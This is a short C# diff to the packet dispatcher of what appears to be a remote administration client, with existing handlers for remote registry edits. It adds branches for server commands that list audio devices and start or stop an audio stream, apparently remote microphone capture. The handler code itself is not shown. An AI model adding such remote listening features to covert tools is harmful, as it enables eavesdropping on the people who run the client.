@@ -168,6 +168,15 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleRenameRegistryValue((ServerPackets.DoRenameRegistryValue)packet, client);
             }
+            else if(type == typeof(ServerPackets.GetAudioDevices)) {
+                CommandHandler.HandleGetAudioDevices((ServerPackets.GetAudioDevices)packet, client);
+            }
+            else if(type == typeof(ServerPackets.GetAudioStream)) {
+                CommandHandler.HandleGetAudioStream((ServerPackets.GetAudioStream)packet, client);
+            }
+            else if(type == typeof(ServerPackets.StopAudioStream)) {
+                CommandHandler.HandleStopAudioStream((ServerPackets.StopAudioStream)packet, client);
+            }
             else if (type == typeof(ServerPackets.DoChangeRegistryValue))
             {
                 CommandHandler.HandleChangeRegistryValue((ServerPackets.DoChangeRegistryValue)packet, client);
